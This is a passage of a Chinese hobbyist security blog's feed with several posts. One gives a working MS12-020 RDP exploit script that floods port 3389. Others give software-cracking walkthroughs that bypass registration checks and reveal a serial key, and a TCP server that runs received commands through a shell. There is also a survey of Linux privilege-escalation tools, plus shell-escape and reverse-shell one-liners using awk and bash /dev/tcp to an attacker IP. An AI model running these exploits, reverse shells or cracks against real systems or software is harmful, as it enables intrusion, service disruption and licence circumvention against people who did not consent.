      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>放假回来意外的想写一个MS12-020的脚本，然后便去github搜了代码，看了一下。get到思路了<br>mmp，今天还要开家长会？？？ 凉凉= =<br><img src="https://s1.ax1x.com/2018/11/25/FkZbbd.md.jpg" alt="FkZbbd.md.jpg"></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=0&id=874077433&auto=1&height=430"></iframe><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>MS12-020漏洞公告与相关的bud：<a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2012/ms12-020" target="_blank" rel="noopener">Microsoft Security Bulletin MS12-020 - Critical | Microsoft D补丁</a><br>MS12-020的exp：<a href="https://github.com/traceur/MS12-020_POC/blob/master/MS12-020_exploit.py" target="_blank" rel="noopener">MS12-020_POC/MS12-020_exploit.py at master · traceur/MS12-020_POC · GitHub</a></p><p>从上面的链接得到shellcode:</p><pre><code>buf=&quot;030000130ee000000000000100080000000000&quot;buf1=&quot;030001d602f0807f658201940401010401010101ff30190204000000000204000000020204000000000204000000010204000000000204000000010202ffff020400000002301902040000000102040000000102040000000102040000000102040000000002040000000102020420020400000002301c0202ffff0202fc170202ffff0204000000010204000000000204000000010202ffff02040000000204820133000500147c0001812a000800100001c00044756361811c01c0d800040008008002e00101ca03aa09040000ce0e000048004f005300540000000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca010000000000100007000100300030003000300030002d003000300030002d0030003000300030003000300030002d003000300030003000300000000000000000000000000000000000000000000000000004c00c000d0000000000000002c00c001b0000000000000003c02c0003000000726470647200000000008080636c6970726472000000a0c0726470736e640000000000c0&quot;buf2=&quot;0300000802f08028&quot;</code></pre><p>具体代码：</p><pre><code>import socketimport binasciifrom secistsploit.core.exploit import *from secistsploit.core.tcp.tcp_client import TCPClientclass Exploit(TCPClient):    __info__ = {        &quot;name&quot;: &quot;MS12-020_exploit&quot;,        &quot;description&quot;: &quot;Origin of loopholes锛歨ttps://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2012/ms12-020&quot;,        &quot;authors&quot;: (            &quot;demonsec&quot;,        ),        &quot;references&quot;: (             &quot;www.ggsec.cn &quot;             &quot;www.secist.com&quot;        ),    }    RHOSTS=OptIP(&quot;&quot;,&quot;Set RHOSTS IP&quot;)    RPORT=OptPort(3389,&quot;Set RHOSTS Port&quot;)    def__init__(self):        self.endianness = &quot;&lt;&quot;    def run(self):        RHOSTS=(self.RHOSTS)        RPORT=(self.RPORT)        print(&#39;[+] RHOSTS:{}&#39;.format(RHOSTS))        print(&#39;[+] RPORT:{}&#39;.format(RPORT))        if RHOSTS!=&#39;&#39; and RPORT!=&#39;&#39;:            buf = binascii.unhexlify(&quot;030000130ee000000000000100080000000000&quot;)            buf1 = binascii.unhexlify(&quot;030001d602f0807f658201940401010401010101ff30190204000000000204000000020204000000000204000000010204000000000204000000010202ffff020400000002301902040000000102040000000102040000000102040000000102040000000002040000000102020420020400000002301c0202ffff0202fc170202ffff0204000000010204000000000204000000010202ffff02040000000204820133000500147c0001812a000800100001c00044756361811c01c0d800040008008002e00101ca03aa09040000ce0e000048004f005300540000000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca010000000000100007000100300030003000300030002d003000300030002d0030003000300030003000300030002d003000300030003000300000000000000000000000000000000000000000000000000004c00c000d0000000000000002c00c001b0000000000000003c02c0003000000726470647200000000008080636c6970726472000000a0c0726470736e640000000000c0&quot;)            buf2 = binascii.unhexlify(&quot;0300000802f08028&quot;) //通过binascii.unhexlify转换成16进制exp            shellcode = buf + buf1 + buf2 //根据exp上的将buf组合起来            while True:                try:                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                    s.connect((RHOSTS, RPORT))                    s.sendall(shellcode)                    rec = s.recv(1024)                    s.close()                    print(&#39;[^] Attack completion&#39;)                except:                    print(&#39;[+] Successed!&#39;)                    exit()</code></pre><p>测试结果：<br><img src="https://s1.ax1x.com/2018/11/25/FkZLVA.md.jpg" alt="FkZLVA.md.jpg"></p><p><img src="https://s1.ax1x.com/2018/11/25/FkZOUI.md.jpg" alt="FkZOUI.md.jpg"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>内存补丁</title>
      <link href="/posts/7cf8a828.html"/>
      <url>/posts/7cf8a828.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>shark恒第十八课，内存补丁。在开始之前，先说一下何为内存补丁<br>内存补丁：内存补丁在程序运行之前候修改指定的指令任何在运行程序从而实现破解，程序的主体无任何变动。<br><img src="http://pic.netbian.com/uploads/allimg/180805/162957-15334577973962.jpg" alt="162957-15334577973962.jpg"></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=0&id=874077433&auto=1&height=430"></iframe><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>拿到程序首先进行常规查壳(PEID走起)<br>VB写的，无壳<br><img src="https://s1.ax1x.com/2018/11/17/izYxAA.png" alt="izYxAA.png"></p><p>运行程序看看能不能发现什么关键字<br><img src="https://s1.ax1x.com/2018/11/17/iztC1f.png" alt="iztC1f.png"><br>点击继续试用，找到关键字字 “（未注册）”<br><img src="https://s1.ax1x.com/2018/11/17/iztijS.png" alt="iztijS.png"><br>载入OD进行关键字搜索，然后看见了“(已注册)”<br><img src="https://s1.ax1x.com/2018/11/17/iztkng.md.png" alt="iztkng.md.png"><br>点进已注册看看<br>发现很多跳转<br><img src="https://s1.ax1x.com/2018/11/17/iztE7j.png" alt="iztE7j.png"><br>往上面翻翻，看看有什么收获。然后发现了一个大跳je，跳过了已注册<br><img src="https://s1.ax1x.com/2018/11/17/iztt41.png" alt="iztt41.png"><br>那么把他NOP掉就是已注册了，但是我们这课学的是内存补丁。自然不是更改程序住体<br>打开内存补丁制作工具，然后进行补丁制作<br>打开，选择其他，选择制作内存补丁</p><pre><code>长度：没两个数字算一个长度，这里有12个数字，所以12除于2指令：指令就是地址右边的那个框框修改后：NOP后有6个90</code></pre><p><img src="attachments\91fd1075.png" alt="91fd1075.png"><br>生成之后执行补丁，效果如下：<br><img src="https://s1.ax1x.com/2018/11/17/izNuad.md.png" alt="izNuad.md.png"></p><p><img src="https://s1.ax1x.com/2018/11/17/izNQPI.png" alt="izNQPI.png"></p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>从开始到现在学了那么多知识后做一次总结：</p><pre><code class="```">1.首先判断软件有没有加壳，用peid看，如果加了壳就找对应的脱壳工具，进行脱壳。2.然后运行软件，观察软件的运行。获取关键字。如:密码错误的那个3.把软件拖入od进行搜索关键字，双击关键字的那行。然后跳到CPU区，进行断点。f6运行程序看程序是不是跳到哪里。如果跳转成立的线是红色的，不成立则为灰色，跳转标识符，然后进行noop填聪(就是什么也没有)，然后软件就破解了。自己可以考虑用C写个简单的登陆程序，进行破解。完毕注意:搜索用智能搜索，搜索关键字要模糊化，不要全部打上。搜索跳转到CPU区之后先看软件的运行流程，分析软件，下断点，按f6运行程序进行调试。然后进行下一步。破解完后如果要进行保存，点击复制到可执行文件，选择，保存文件。给他取个名字破解要用反向思维来想。比如他跳转不成功进入到报错。那他跳转成功是否是正确的呢？注意:当修改CPU区的代码的时候按空格，修改必须保证修改的代码为16进制当你脱壳之后，因为现在壳都有压缩功能。所有脱壳之后文件会变大，如果文件变大了。如果PE有检测文件大小功能，如果文件大小不等于有壳时候的大小就会退出PE。判断是否有自效验就是，脱壳后PE打不开。将PE拖入到OD设置API断点-&gt;常用断点-&gt;文件大小断点。F9运行，发现程序被断下来了，在右下角的窗口可以看见判断函数，点击反汇编数据窗口跟踪，然后如果发现。cmp 十六进制（文件大小），然后用Noop填充即可一般有关键跳上面就有关键call,z载入OD的程序可以观察一下有什么注册成功之类的关键字。上面就有关键跳和关键call，找主要跳转。如果关键跳跳过了正确程序的话，可以从关键call中进行更改使关键call达到正确的程序，关键call和关键跳中有笔记,test可以仔细观察一下先用API断点函数下一个ReadFile读文件的函数，如果有壳则用401000跳到字符区。然后搜索关键字，双击关键字跳到反汇编窗口F2下断点，将读文件的断点禁止，运行软件跳到断点之后往上看判断，是否有真码ini类型重启验证(重启验证之后没有任何关键字提示)，我们就用不了ReadFile类型断点任何在搜索关键字来搜索真码，但是我们可以用BP下个GetPrivateProfileStringA断点，专门用于对付ini重启验证。知识点记录：程序领空：OD左上角文件名如果文件是程序名就是程序领空系统领空：OD左上角文件名如果不是程序名的话就是系统领空如果遇见系统领空的话就按Alt+F9(或者在调试按执行到用户代码)跳出系统领空，然后单步寻找真码因为PE头部被修改，将PE载入到OD之后直接运行程序。右键-&gt;查找-&gt;模块user32。到了模块user32之后进行查找-&gt;二进制字符串-&gt;搜索：F3 A5 8B C8 83 E1 03 F3 A4 E8，双击跳转。然后在合适的步骤下断点，等程序断下来之后Alt+F9跳出系统领空，找真码即可。首先判断是不是VB写的，如果是VB写的话有几个特征有一个push,jmp &amp;MSVBxxx,往上拉还能发现vb的函数F9运行程序，然后到弹出框框的那里回到OD按F12暂停OD。之后到OD菜单栏上方按K找到 user32.MessageBoxExA 当然不只是这个。还有其他的，然后右键显示调用。之后对跳到的地方下断，F8运行下去跳出系统领空然后我们往上面翻可以看见段首和段尾， F8往下单步，看看有什么神奇的东西（如果没有什么，那么出call）， 出call之后我们发现了弹框的call还有弹出这个框框的关键跳 对jnz下断修改Z标志位，将jnz改为jmp删除VMP虚拟机检测：1\. 首先下断点到LocalAlloc2\. 中断下来后，在数据窗口CTRL+G输入ESP, 然后从这个地址开始搜索 当前模块加载基地址 如这里的 011C0000    不过这里为了保险，防止搜索到多个结果，应该搜索 模块默认加载基地址 \+ 模块当前加载基地址 组合起来的8个字节1.搜索LocalAlloc2.下断，然后运行程序，寄存器窗口选中esp右键数据窗口跟随3.按菜单栏上的e，查看基址4.搜索地址5.在数据窗口中修改[https://867810770.github.io/2018/09/25/VMP3-12过虚拟机检测/#more](https://867810770.github.io/2018/09/25/VMP3-12%E8%BF%87%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/#more)我们可以学到：如果找不到关键跳的情况下，对段首下断点进行单步调试说不定能找到惊喜。一般真码验证在关键跳上方可以找到脱壳谨记：1.遇到壳的时候要先查壳，如果PEID查不出什么语言写的用DELE查2.然后查到什么语言后先去查OEP是怎么样的，不要OEP过了都不知道3.BC++壳脱完后要手动寻找IAT地址，不要认为是自效验通过按钮获取关键位：当你发现一个PE上有很多按钮的时候而你要破解的地方也是要使用按钮的话，你可以用DarkDe分析PE的按钮的位置然后，在OD定位。一个一个下断，在定位按钮，看看那个是你要弄的按钮，分析下面的代码因为你会跳到按钮那，也就是说按钮下面的代码是处理判断的[https://422926799.github.io/2018/10/20/%E4%BD%BF%E7%94%A8DarkDe%E9%80%9A%E8%BF%87%E6%8C%89%E9%92%AE%E4%BA%8B%E4%BB%B6%E5%AF%BB%E6%89%BE%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E9%83%A8%E5%88%86/](https://422926799.github.io/2018/10/20/%E4%BD%BF%E7%94%A8DarkDe%E9%80%9A%E8%BF%87%E6%8C%89%E9%92%AE%E4%BA%8B%E4%BB%B6%E5%AF%BB%E6%89%BE%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E9%83%A8%E5%88%86/)程序飞了，就对那个飞了的call下段，然后重新运行，然后F7进入程序遇见循环，在循环的下一行，选中那个位置。然后F4（F4是运行到指定位置）内存补丁：本文</code></pre><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>解决socket TCP粘包</title>
      <link href="/posts/ee45ea9a.html"/>
      <url>/posts/ee45ea9a.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在socket网络程序中，TCP和UDP分别是面向连接和非面向连接的。因此TCP的socket编程，收发两端（客户端和服务器端）都要有成对的socket，因此，发送端为了将多个发往接收端的包，更有效的发到对方，使用了优化方法（Nagle算法），将多次间隔较小、数据量小的数据，合并成一个大的数据块，然后进行封包。这样，接收端，就难于分辨出来了，必须提供科学的拆包机制。</p><p>对于UDP，不会使用块的合并优化算法，这样，实际上目前认为，是由于UDP支持的是一对多的模式，所以接收端的skbuff(套接字缓冲区）采用了链式结构来记录每一个到达的UDP包，在每个UDP包中就有了消息头（消息来源地址，端口等信息），这样，对于接收端来说，就容易进行区分处理了。所以UDP不会出现粘包问题。<br><img src="http://pic.netbian.com/uploads/allimg/181108/220632-15416859924c51.jpg" alt="220632-15416859924c51.jpg"><br>拔剑神曲βios:<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=34179077&auto=1&height=66"></iframe></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>server端：</p><pre><code>import socketimport subprocessimport structimport jsondef server(host,port):    servers=socket.socket(socket.AF_INET,socket.SOCK_STREAM)    servers.bind((host,port))    servers.listen(1)    while True:        shargs,args=servers.accept()        print(&#39;[+] ソースIP:{}&#39;.format(args[0]))        while True:            try:                msg=shargs.recv(1024)                res=subprocess.Popen(msg.decode(&#39;utf-8&#39;),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)                out_read=res.stdout.read()                err_read=res.stderr.read()                data_size=len(out_read)+len(err_read) /获取数据长度                head_dic={&quot;data_size&quot;:data_size} //打包成json                head_json=json.dumps(head_dic) //为str类型                head_bytes=head_json.encode(&#39;utf-8&#39;) //报文编码为utf8                head_len=len(head_bytes) //报文长度                shargs.sendall(struct.pack(&quot;i&quot;,head_len)) //先发送报文长度                shargs.sendall(head_bytes) //发送报文                shargs.sendall(out_read) //发送真实数据                shargs.sendall(err_read)            except:                passif __name__ == &#39;__main__&#39;:    host=&#39;127.0.0.1&#39;    port=4448    server(host,port)</code></pre><p>client段</p><pre><code>import socketimport structimport jsondef client(host,port):    clients=socket.socket(socket.AF_INET,socket.SOCK_STREAM)    try:        clients.connect((host,port))        print(&#39;[+] 接続が成功する&#39;)    except:        print(&#39;[-] 接続失敗&#39;)        exit()    while True:        user=input(&#39;コマンドを入力してください:&#39;)        if not user:            continue        clients.sendall(bytes(user,encoding=&#39;utf8&#39;))         head_rec=clients.recv(4) //读取4个字符        print(&#39;head_rec&#39;,head_rec)         head_len=struct.unpack(&quot;i&quot;,head_rec)[0] //解开报文第一个字符为16进制（获取长度）        print(head_len)        head_byte=clients.recv(head_len) //读取指定长度的数据        print(&#39;head_byte:&#39;,head_byte)         head_json=head_byte.decode(&#39;utf8&#39;) //获取到json并解码为utf8        head_dic=json.loads(head_json) //解析josn        data_size=head_dic[&quot;data_size&quot;] //得到字节总        recv_size=0        recv_data=b&#39;&#39;        while recv_size&lt;data_size:             js=clients.recv(1024) //读取数据            print(js)            recv_size+=len(js) //字节和返回数据长度加在一起            print(recv_size)            print(&#39;recv_data:&#39;,recv_data) //b&#39;&#39;+返回数据            recv_data+=js         print(recv_data.decode(&#39;utf-8&#39;)) //解码为utf-8    clients.close()if __name__ == &#39;__main__&#39;:    host=&#39;127.0.0.1&#39;    port=4447    client(host,port)</code></pre><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>通过脚本升级Linux权限</title>
      <link href="/posts/7eb122.html"/>
      <url>/posts/7eb122.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文翻译自<a href="http://www.hackingarticles.in/linux-privilege-escalation-via-automated-script/" target="_blank" rel="noopener">Linux Privilege Escalation via Automated Script</a><br><img src="http://img.netbian.com/file/2018/0501/7bfb095480846b26e8fb392e3294ab28.jpg" alt="7bfb095480846b26e8fb392e3294ab28.jpg"></p><p>music:<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=34179077&auto=1&height=66"></iframe></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>我们都知道，在破坏受害者的机器之后，我们有一个低权限的shell，我们想要升级到更高权限的shell，这个过程称为权限提升。今天在本文中，我们将讨论权限提升的内容以及攻击者如何识别低权限shell可以升级到更高权限的shell。但除此之外，还有一些Linux脚本在尝试升级目标系统上的权限时可能会有用。这通常旨在枚举而不是特定的漏洞/漏洞利用。这种类型的脚本可以节省您的时间。<br>表中的内容<br>介绍<br>权限提升的向量<br>LinuEnum<br>Linuxprivchecker<br>Linux Exploit Suggester 2<br>Bashark<br>BeRoot<br>介绍<br>基本上，权限提升是攻击者攻击受害者机器之后的一个阶段，他试图收集与系统相关的关键信息，如隐藏密码和弱配置服务或应用程序等。所有这些信息都有助于攻击者利用帖子进行攻击反对机器获得更高权限的shell。</p><p>权限提升的向量<br>操作系统详细信息和内核版本<br>安装或运行任何Vulnerable包<br>具有完全控制或修改访问权限的文件和文件夹<br>具有SUID权限的文件<br>映射驱动器（NFS）<br>潜在有趣的文件<br>环境变量路径<br>网络信息（接口，arp，netstat）<br>运行进程<br>Cronjobs<br>用户的Sudo Right<br>通配符注入<br>在Penetration测试中有几个脚本用于快速识别Windows系统上的潜在权限提升向量，今天我们将详细说明每个脚本正在顺利运行。</p><p>LinuEnum<br>脚本本地Linux枚举和权限提升检查Shellscript，它枚举系统配置和LinEnum执行的检查/任务的高级摘要。</p><p>特权访问：诊断当前用户是否具有没有密码的sudo访问权限; root的主目录是否可访问。</p><p>系统信息：主机名，网络详细信息，当前IP等。</p><p>用户信息：当前用户，列出所有用户，包括uid / gid信息，列出root帐户，检查密码哈希是否存储在/ etc / passwd中。</p><p>内核和分发版本详细信息。</p><p>您可以通过以下命令通过github下载它：</p><pre><code>git clone https://github.com/rebootuser/LinEnum.git</code></pre><p><img src="https://s1.ax1x.com/2018/11/11/iqNMO1.png" alt="iqNMO1.png"><br>下载此脚本后，您只需 在终端上绑定./LinEnum.sh即可运行它  。因此，它将转储所有获取的数据和系统详细信息。</p><p>让我们分析它给我们带来的结果：</p><p>操作系统和内核信息： 4.15.0-36-generic，Ubuntu-16.04.1<br><img src="https://s1.ax1x.com/2018/11/11/iqNa6A.png" alt="iqNa6A.png"><br>此外…..</p><p>超级用户帐户：root</p><p>Sudo Rights用户：jiu</p><p>主页目录文件权限</p><p>环境信息</p><p>还有更多这样的事情属于邮政剥削。<br><img src="https://s1.ax1x.com/2018/11/11/iqNB0P.md.png" alt="iqNB0P.md.png"><br>这个脚本的功能有以下功能：</p><pre><code>1.列出系统的版本信息2.具体分布信息3.主机名4.目前的权限5.以前系统登录到的用户6.其他人登录7.所有组8.列出管理用户9.列出/etc/passwd的内容10.超级用户账户11.Sudo Rights用户12.主页目录文件权限13.环境信息14.路径信息15.可用的shell16.当前用户的值17.密码和存储信息18.时间运行事件19.文件权限20.jobs最后的执行时间21.系统计时22.网络信息23.ARP缓存表24.路由表25.开启的TCP端口26.开启的UDP端口27.正在运行的进程和权限28.运行进程29./ETC/IIT.D/二进制权限30./LB/StReD/*CONFIG文件权限31.sudo版本32.mysql版本33.Apache版本34.Apache的插件35.有用的文件位置36.已安装的编译器37.敏感文件的权限38.所有的conf文件39.当前用户的历史文件40.执行过的命令41.纽约趣味邮件/VAL/mail42.docker版本43.dorcker文件44.所有yml文件</code></pre><p>Linuxprivchecker<br>枚举系统配置并运行一些权限提升检查。这是一个python实现，建议特定于系统的漏洞利用。使用wget从其源URL下载脚本。</p><pre><code>wget http://www.securitysift.com/download/linuxprivchecker.py</code></pre><p>现在使用这个脚本只需 在终端上键入 python linuxprivchecke.py，这将枚举文件和目录权限/内容。此脚本与LinEnum的工作方式相同，并且可以搜索与系统网络和用户相关的详细信息。</p><p>python linuxprivchecker.py<br><img src="https://s1.ax1x.com/2018/11/11/iqUVBt.png" alt="iqUVBt.png"><br>Root以外用户的可写目录和文件<br><img src="https://s1.ax1x.com/2018/11/11/iqUlcj.md.png" alt="iqUlcj.md.png"></p><p>检查Root的主文件夹是否可访问<br><img src="https://s1.ax1x.com/2018/11/11/iqdCyd.png" alt="iqdCyd.png"></p><p>具有SUID / SGID权限的文件<br><img src="https://s1.ax1x.com/2018/11/11/iqdATP.md.png" alt="iqdATP.md.png"><br>Linux Exploit Suggester 2<br>基于Linux_Exploit_Suggester的下一代漏洞利用建议器。该程序执行’uname -r ‘以获取Linux操作系统发行版，并返回可能的漏洞利用列表。</p><p>此脚本对于快速查找现场和考试环境中的权限提升漏洞非常有用。</p><p>主要改进包括：</p><p>更多的漏洞<br>准确的通配符匹配。这扩大了可搜索漏洞的范围。<br>输出着色，便于查看。<br>还有更多</p><pre><code>git clone https://github.com/jondonas/linux-exploit-suggester-2.gitcd linux-exploit-suggester-2</code></pre><p>这里我就不整这款了</p><p>Bashark<br>Bashark在安全审计的后期开发阶段帮助测试人员和安全研究人员。</p><p>它的特点</p><p>单个Bash脚本<br>轻巧快速<br>多平台：Unix，OSX，Solaris等<br>没有外部依赖<br>免疫启发式和行为分析<br>内置常用shell命令的别名<br>使用面向开发后的功能扩展系统shell<br>隐身，退出时激活自定义清理例程<br>易于扩展（通过创建Bash函数添加新命令）<br>完整标签完成<br>执行以下命令从github下载它：</p><pre><code>git clone https://github.com/TheSecondSun/Bashark.gitcd Bashark</code></pre><p><img src="https://s1.ax1x.com/2018/11/11/iqd40I.md.png" alt="iqd40I.md.png"><br>他的帮助：<br><img src="https://s1.ax1x.com/2018/11/11/iqd7h8.png" alt="iqd7h8.png"><br>扫描出开放的端口和寻找conf文件<br><img src="https://s1.ax1x.com/2018/11/11/iqdb9S.md.png" alt="iqdb9S.md.png"><br>使用getprem选项查看目标计算机的所有二进制文件<br><img src="https://s1.ax1x.com/2018/11/11/iqdLcQ.png" alt="iqdLcQ.png"><br>获取用户名<br><img src="https://s1.ax1x.com/2018/11/11/iqw1jH.png" alt="iqw1jH.png"><br>BeRoot<br>BeRoot项目是一种后期利用工具，用于检查常见的错误配置，以找到升级我们的权限的方法。这个工具没有实现任何利用。它的主要目标不是实现主机的配置评估（列出所有服务，所有进程，所有网络连接等），而是仅打印已被发现作为升级我们的权限的潜在方式的信息。</p><pre><code>git clone https://github.com/AlessandroZ/BeRoot.gitcd Linuxchmod 777 beroot.py</code></pre><p><img src="https://s1.ax1x.com/2018/11/11/iqww8S.md.png" alt="iqww8S.md.png"><br>枚举出的提权漏洞<br><img src="https://s1.ax1x.com/2018/11/11/iqwruj.png" alt="iqwruj.png"><br>PS：这款工具还有针对windows的</p><p>以上就到这里，先溜</p><p>总结：</p><pre><code>使用好这几款脚本进行信息收集提权，应该不难</code></pre><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>破解某仓库软件</title>
      <link href="/posts/3774494d.html"/>
      <url>/posts/3774494d.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚刚考完期中考试，回来学习shark恒第17课，记录如下<br><img src="https://s1.ax1x.com/2018/11/09/ibtFkF.jpg" alt="ibtFkF.jpg"><br>期中考，睡了二节课，没写作文…..<br>music:<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=489302379&auto=1&height=66"></iframe></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>拿到PE程序还是常规操作，首先查壳<br><img src="https://s1.ax1x.com/2018/11/09/ibtkY4.png" alt="ibtkY4.png"><br>查壳之后发现无壳，直接将程序载入OD<br><img src="https://s1.ax1x.com/2018/11/09/ibtAfJ.png" alt="ibtAfJ.png"><br>F9运行程序，然后输入假码，F12暂停在错误部分<br><img src="https://s1.ax1x.com/2018/11/09/ibthAU.md.png" alt="ibthAU.md.png"><br>按快捷键Alt+F9跳到代码区，然后在错误框框里按确认<br><img src="https://s1.ax1x.com/2018/11/09/ibt5h4.png" alt="ibt5h4.png"><br>发现错误的call，然后往上分析，看见两个jmp。发现三个jmp，其中两个jmp都是跳到错误call的，一个jmp跳回到程序开始<br><img src="https://s1.ax1x.com/2018/11/09/ibt7cR.md.png" alt="ibt7cR.md.png"></p><p><img src="https://s1.ax1x.com/2018/11/09/ibtqnx.png" alt="ibtqnx.png"></p><p>这三个jmp先不管，继续往上翻。可以看到一个je，并且是实现跳转，跳到错误call<br><img src="https://s1.ax1x.com/2018/11/09/ibtjAO.png" alt="ibtjAO.png"><br>将这个je，下断点。重新运行程序，然后发现是关键跳，那么上面的call就是关键call了<br><img src="https://s1.ax1x.com/2018/11/09/ibNiut.md.png" alt="ibNiut.md.png"><br>修改Z标志位可以实现注册成功<br><img src="https://s1.ax1x.com/2018/11/09/ibNEE8.md.png" alt="ibNEE8.md.png"><br>以为这样就搞定了，然后发现是重启验证<br><img src="https://s1.ax1x.com/2018/11/09/ibNVUS.png" alt="ibNVUS.png"><br>既然这样，我们只能对他的关键call进行下断。然后进call找激活码（PS:关键跳是判断激活码是否正确的，那么关键call就是对比激活码的。代码在到关键跳进行判断）<br><img src="https://s1.ax1x.com/2018/11/09/ibNn3j.png" alt="ibNn3j.png"><br>F7进call，过循环，F8单步几下即可找到真码<br><img src="https://s1.ax1x.com/2018/11/09/ibNavR.md.png" alt="ibNavR.md.png"></p><p><img src="https://s1.ax1x.com/2018/11/09/ibNwK1.png" alt="ibNwK1.png"></p><p><img src="https://s1.ax1x.com/2018/11/09/ibN0Dx.png" alt="ibN0Dx.png"></p><p><img src="https://s1.ax1x.com/2018/11/09/ibNRxA.md.png" alt="ibNRxA.md.png"><br>真码为：DEPw-1303245d5-0303<br>感谢观看！</p><p>转载请转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux绕过本地安全策略防御</title>
      <link href="/posts/49ae8f0.html"/>
      <url>/posts/49ae8f0.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>This is Linux绕过本地安全策略….<br><img src="http://d.5857.com/quanzhilieren_141016/004.jpg" alt=""><br>music:<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=718765&auto=1&height=66"></iframe></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>apt-get 获取shell</p><pre><code>apt-get changelog apt`</code></pre><p><img src="https://s1.ax1x.com/2018/11/03/i59qzD.png" alt="i59qzD.png"><br><img src="https://s1.ax1x.com/2018/11/03/i59XsH.png" alt="i59XsH.png"></p><p>aria2c<br>执行命令：</p><pre><code>COMMAND=&#39;id&#39;TF=$(mktemp)echo &quot;$COMMAND&quot; &gt; $TFchmod +x $TFaria2c --on-download-error=$TF http://x</code></pre><p>ash<br>获取shell</p><pre><code>ash</code></pre><p><img src="https://s1.ax1x.com/2018/11/04/i5PaHs.md.png" alt="i5PaHs.md.png"><br>写入文件</p><pre><code>export LFILE=&quot;1.txt&quot;ash -c &#39;echo haq5201314 &gt; $FILE&#39;</code></pre><p><img src="https://s1.ax1x.com/2018/11/04/i5Ps3T.png" alt="i5Ps3T.png"></p><p>awk<br>获取shell</p><pre><code>awk &#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39;</code></pre><p><img src="https://s1.ax1x.com/2018/11/04/i5e5ct.png" alt="i5e5ct.png"><br>反弹shell</p><pre><code> awk &#39;BEGIN{s=&quot;/inet/tcp/0/192.168.89.136/4444&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)}&#39;</code></pre><p>受害机上执行<br><img src="https://s1.ax1x.com/2018/11/04/i5mEC9.png" alt="i5mEC9.png"><br>攻击者上执行<br>nc -lvp 4444<br><img src="https://s1.ax1x.com/2018/11/04/i5mV3R.png" alt="i5mV3R.png"></p><p>base64读取文件</p><pre><code>LFILE=&quot;/etc/passwd&quot;base64 &quot;$LFILE&quot; | base64 --decode</code></pre><p><img src="https://s1.ax1x.com/2018/11/04/i5mZg1.png" alt="i5mZg1.png"></p><p>bash反弹shell</p><pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.89.136/12345 0&gt;&amp;1&#39;</code></pre><p><img src="https://s1.ax1x.com/2018/11/04/i5muDK.png" alt="i5muDK.png"></p><pre><code>nc -lvp 12345</code></pre><p><img src="https://s1.ax1x.com/2018/11/04/i5mKHO.png" alt="i5mKHO.png"></p><p>详细文章请看：<a href="https://gtfobins.github.io/gtfobins/busybox/" target="_blank" rel="noopener">busybox | GTFOBins</a><br>你想要反的shell：<a href="https://www.freebuf.com/articles/system/147768.html" target="_blank" rel="noopener">关于Shell你想知道的都在这儿 - FreeBuf互联网安全新媒体平台</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>程序跑飞了</title>
      <link href="/posts/fbb10a6b.html"/>
      <url>/posts/fbb10a6b.html</url>
